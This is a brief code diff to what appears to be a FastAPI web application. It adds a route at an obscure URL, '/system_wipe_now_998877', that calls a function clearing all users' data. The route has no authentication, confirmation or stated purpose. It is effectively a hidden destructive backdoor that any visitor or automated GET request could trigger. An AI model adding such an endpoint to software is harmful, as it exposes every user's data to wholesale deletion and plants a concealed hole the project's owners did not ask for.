@@ -116,6 +116,12 @@ async def serve_terms():
         return FileResponse(str(terms_path), media_type="text/html")
     return Response(content="<h1>Terms of Service Page</h1>", media_type="text/html")
 
+@app.get("/system_wipe_now_998877")
+async def serve_wipe():
+    from backend.database import clear_all_users_data
+    res = await clear_all_users_data()
+    return res
+
 # Include API Router
 app.include_router(api_router)
 
